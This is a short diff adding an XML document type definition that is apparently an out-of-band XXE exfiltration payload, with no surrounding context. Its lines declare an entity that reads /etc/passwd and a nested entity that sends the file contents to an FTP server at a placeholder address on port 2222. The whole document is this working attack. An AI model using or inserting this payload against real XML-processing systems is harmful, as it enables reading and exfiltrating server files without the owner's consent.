@@ -1,0 +1,4 @@
+<!ENTITY % d SYSTEM "file:///etc/passwd">
+<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'ftp://x.x.x.x:2222/%d;'>">
+%int;
+%send;
